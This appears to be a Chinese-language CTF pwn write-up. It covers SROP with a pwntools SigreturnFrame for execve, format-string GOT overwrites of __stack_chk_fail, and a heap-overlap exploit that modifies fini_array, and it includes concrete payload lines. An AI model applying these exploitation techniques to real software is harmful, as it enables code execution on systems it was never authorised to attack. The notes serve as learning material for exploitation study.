要点1

在本道题目中学到的第一点是形如这种函数中有栈溢出漏洞时：

应当发现其没有leave指令。这也导致了ida对sp寄存器的分析失败。本题中算返回地址偏移时不应加上8！

要点2

SROP利用基本原理：

【技术分享】Sigreturn Oriented Programming攻击简介-安全客 - 安全资讯平台 (anquanke.com)

讲的很清楚，其实Sigreturn就是正常信号处理中用于恢复上下文（即寄存器信息）的一个系统调用。当处理其他系统调用前，程序会将上下文存储在栈上。特定系统调用结束后，程序调用Sigreturn来进行上下文的恢复。使用pwntools中的SigretutnFrame工具时记得指定架构！

context.arch = 'amd64'
frame = SigreturnFrame()
frame.rip = syscall
frame.rdi = buf_addr
frame.rsi = 0
frame.rdx = 0
frame.rax = 0x3b

r2t4

格式化字符串漏洞，这里说几个要点。

要点1

本题目的利用方式是修改'__stack_chk_fail'GOT表中的地址（没开PIE），使得触发栈溢出保护的时候跳转到后门函数。

要点2

格式化字符串中都%k$n为在第k个参数的位置上的存的地址内写入四个字节。hn为两个，hhn为一个，写入的内容为已经输出的字节数。

如果是

printf(buf)

的话，buf本身为第一个参数，从buf的第二个字长的起始为第7个参数（）前六个在寄存器中。

值得注意的是，机器字长为划分参数的单位。故应当确保格式化字符串字长对齐（尤其是地址任意写，下面便是例子）。

要点3

payload = p64(stack_check_got + 2) + p64(stack_check_got + 2) + p64(stack_check_got) + b'%40c%7$hn%1510c%8$hnaass' + b'fuck' * 10

payload = b'%64c%9$hn%1510c%10$hn\x00\x00\x00'  + p64(stack_check_got + 2) + p64(stack_check_got) + b'fuck' * 10

这两种payload虽然效果看起来一样，但是第一种中地址带有\x00， printf显然会在该处被截断，也就无法实现后面的修改。下面这个虽然前面也带了\x00，但后面的地址写在栈上即可，不需要其被打印或者解析，故无妨。

要点4

其实也不算是个要点，更多是一个最好记住的小 tips:在64位下，函数的前五个参数在参数寄存器中，第六个参数从栈上格式化字符串本身开始算

本体涉及堆的主要就是一个无限制输入然后实现堆重叠加上格式化。在submit的时候给它我们先前释放的堆块。从而可以控制dest堆块以实现格式化字符串。

从而有一次无限制leak（只要它在栈上）。为了控制执行流程让我们有机会重新执行main函数，这里篡改了fini_arry从而实现一次性的流程控制（新的一次main执行完毕之后就直接退出了）。显而易见的一种选择是格式化字符串修改返回地址随后one_gadget控制执行。但我在修改的时候常常出现canary被破坏的情况（待查明）。因此我就选择了将错就错，修改canary后篡改got表劫持__stack_chk_fail，成功。
